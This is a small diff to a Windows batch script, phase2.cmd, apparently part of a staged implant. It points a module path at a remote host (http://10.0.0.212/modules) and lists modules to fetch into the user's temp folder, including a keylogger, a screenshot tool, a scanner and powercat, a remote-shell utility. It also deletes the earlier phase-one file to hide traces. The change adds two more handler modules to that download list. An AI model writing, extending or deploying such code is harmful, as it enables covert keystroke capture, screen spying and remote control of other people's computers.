@@ -6,7 +6,7 @@ set "INITIAL_PATH=%cd%"
 set "FILE_NAME=phase2.cmd"
 set "MODULES_PATH=http://10.0.0.212/modules"
 set "TEMP_PATH=C:\Users\%username%\AppData\Local\Temp"
-set "modulesName=scanner.ps1 screenshot.ps1 keylogger.ps1 powercat.ps1"
+set "modulesName=scanner.ps1 screenshot.ps1 fileHandler jobHandler keylogger.ps1 powercat.ps1"
 
 @REM Remove phase1
 del %PATH_PHASE1%
